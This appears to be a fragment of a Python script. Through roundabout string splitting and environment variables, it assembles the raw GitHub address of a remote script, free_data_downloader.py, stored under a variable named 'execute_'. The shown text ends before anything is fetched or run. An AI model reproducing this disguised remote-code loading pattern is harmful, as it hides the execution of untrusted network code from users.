import os
import sys, os
# Restore
def enablePrint():
    sys.stdout = sys.__stdout__
    
url = '/funciones'
url = url.split('funciones')[0] + 'funciones/gcpdefunctions'
url = url.replace('funciones','') + '/main/other_function/'
os.environ['location'] = 'https://raw.githubusercontent.com/'
os.environ['execute_'] =  'JAPJ182/free_data_downloader.py'
path = os.environ['location']+os.environ['execute_'].split('/')[0]    +url.replace('//','/')+os.environ['execute_'].split('/')[1]   
 
